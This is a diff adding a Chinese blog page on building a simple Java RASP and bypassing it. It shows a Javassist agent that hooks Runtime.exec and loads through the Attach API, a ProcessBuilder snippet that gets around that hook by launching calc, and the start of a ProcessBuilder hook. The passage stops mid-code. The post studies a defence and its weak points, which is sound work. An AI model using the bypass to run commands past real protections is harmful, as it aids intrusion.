@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Ko1sh1">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/03/25/blog_java rasp的实现与绕过/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="最近简单学了点 Rasp 内容">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java Rasp 的简单实现与绕过">
+<meta property="og:url" content="http://example.com/2024/03/25/blog_java%20Rasp%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="最近简单学了点 Rasp 内容">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/blog/image-20240319101348289.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240319104148722.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240319104613603.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240319131745046.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240319145212870.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240320220504191.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240320221410169.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240321191830788.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240321204310963.png">
+<meta property="og:image" content="http://example.com/images/blog/native_implemention.3566ed08.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240324144827295.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240324144912864.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240324145220175.png">
+<meta property="article:published_time" content="2024-03-25T02:51:22.000Z">
+<meta property="article:modified_time" content="2024-05-30T13:13:33.560Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="技巧">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/blog/image-20240319101348289.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+    <meta name="theme-color" content="#FFA07A">
+    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            java Rasp 的简单实现与绕过 -
+        
+        Ko1sh1&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/text.js'></script>
+                
+    
+            
+                
+                    <link rel='stylesheet' href='/css/mouse.css'>
+                
+    
+
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ko1sh1&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links/">
+                                                    师傅们
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links/">师傅们</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/masonry"
+                        >
+                            <span>Photos</span>
+                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/images/blog5.jpg" alt="java Rasp 的简单实现与绕过" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">java Rasp 的简单实现与绕过</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-03-25 10:51:22</span>
+        <span class="mobile">2024-03-25 10:51:22</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-05-30 21:13:33</span>
+            <span class="mobile">2024-05-30 21:13:33</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/java/">java</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%8A%80%E5%B7%A7/">技巧</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>23 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Rasp-Hook-命令执行函数的攻与防"><a href="#Rasp-Hook-命令执行函数的攻与防" class="headerlink" title="Rasp Hook 命令执行函数的攻与防"></a>Rasp Hook 命令执行函数的攻与防</h2><p>本质上就是 agent 技术</p>
+<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>可以简单写一个 agentmain hook 掉 Runtime</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">targetClassName</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(targetClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    instrumentation.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(targetClassName)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = pool.getCtClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">                method.insertBefore(<span class="string">&quot;if(!$1.equals(\&quot;\&quot;))&#123;$1 = \&quot;mspaint\&quot;;&#125;;&quot;</span>);</span><br><span class="line">                method.insertBefore(<span class="string">&quot;System.out.println(\&quot;exec method parameter : \&quot;+ $1 );&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>再写个 Demo 使用 agent 查看结果：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_Runtime/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;MainDemo&quot;</span>))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已找到目标类，将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接，并将 agent.jar 发送给虚拟机&quot;</span>);</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 此时 agent 已被使用，尝试调用 Runtime</span></span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;ozxicjiozjcx&quot;</span>);</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>发现不论我们exec输入什么内容，都会弹出画板，说明hook成功了，我们改成其他内容就可以过滤 Runtime 执行系统命令的内容了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240319101348289.png"
+                      alt="image-20240319101348289"
+                ></p>
+<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><p>在Linux 和 Windows 下对 Runtime 的 exec 方法进行调试。</p>
+<p>Windows 下执行命令最终对应的方法是 java.lang.ProcessImpl#create，该方法是 native 方法，通过 idea 无法再深入调试</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240319104148722.png"
+                      alt="image-20240319104148722"
+                ></p>
+<p>而在 Linux 下最终在 UNIXProcess 类的初始化方法中调用了 native 方法 forkAndExec。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240319104613603.png"
+                      alt="image-20240319104613603"
+                ></p>
+<p>这俩 native 方法后面再说，通过调用栈可以看到 Runtime 的 exec 方法都经过了 ProcessBuilder 的 start 方法，所以我们 hook Runtime 后其实是可以使用 ProcessBuilder 进行绕过的。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">processBuilder.command(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">processBuilder.start();</span><br></pre></td></tr></table></figure></div>
+
+<p>所以我们可以对 ProcessBuilder 的 start 方法进行修改，这样也可以同时防止通过 Runtime 进行的命令执行</p>
+<p>把 transform 小改一下</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">       className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (className.equals(targetClassName)) &#123;</span><br><span class="line">           <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">           System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">           <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               clazz = pool.getCtClass(className);</span><br><span class="line">               <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">               method.insertBefore(<span class="string">&quot;this.command.add(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">               method.insertBefore(<span class="string">&quot;this.command.clear();&quot;</span>);</span><br><span class="line">               <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">               <span class="keyword">return</span> 